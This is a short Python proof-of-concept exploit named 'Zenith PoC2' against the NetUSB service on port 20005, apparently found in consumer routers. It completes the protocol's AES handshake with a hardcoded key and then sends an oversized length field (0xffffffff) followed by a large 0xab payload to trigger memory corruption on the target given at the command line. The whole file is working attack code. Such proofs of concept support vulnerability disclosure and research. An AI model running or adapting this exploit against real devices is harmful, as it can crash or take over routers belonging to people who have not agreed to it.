from Crypto.Cipher import AES
import socket
import struct
import argparse

le8 = lambda i: struct.pack('=B', i)
le32 = lambda i: struct.pack('<I', i)

netusb_port = 20005

def send_handshake(s, aes_ctx):
  # Version
  s.send(b'\x56\x04')
  # Send random data
  s.send(aes_ctx.encrypt(b'a' * 16))
  _ = s.recv(16)
  # Receive & send back the random numbers.
  challenge = s.recv(16)
  s.send(aes_ctx.encrypt(challenge))

def send_bus_name(s, name):
  length = len(name)
  assert length - 1 < 63
  s.send(le32(length))
  b = name
  if type(name) == str:
    b = bytes(name, 'ascii')
  s.send(b)

def create_connection(target, port, name):
  # first_aes_k = bytes.fromhex('a2353556541cfe44ec468248064de66c')
  # aes_ctx = AES.new(first_aes_k, AES.MODE_ECB)
  # second_aes_k = aes_ctx.decrypt(encrypted_second_aes_k)
  second_aes_k = bytes.fromhex('5c130b59d26242649ed488382d5eaecc')
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((target, port))
  aes_ctx = AES.new(second_aes_k, AES.MODE_ECB)
  send_handshake(s, aes_ctx)
  send_bus_name(s, name)
  return s, aes_ctx

def main():
  parser = argparse.ArgumentParser('Zenith PoC2')
  parser.add_argument('--target', required = True)
  args = parser.parse_args()
  s, _ = create_connection(args.target, netusb_port, 'PoC2')
  s.send(le8(0xff))
  s.send(le8(0x21))
  s.send(le32(0xff_ff_ff_ff))
  p = b'\xab' * (0x1_000 * 100)
  s.send(p)
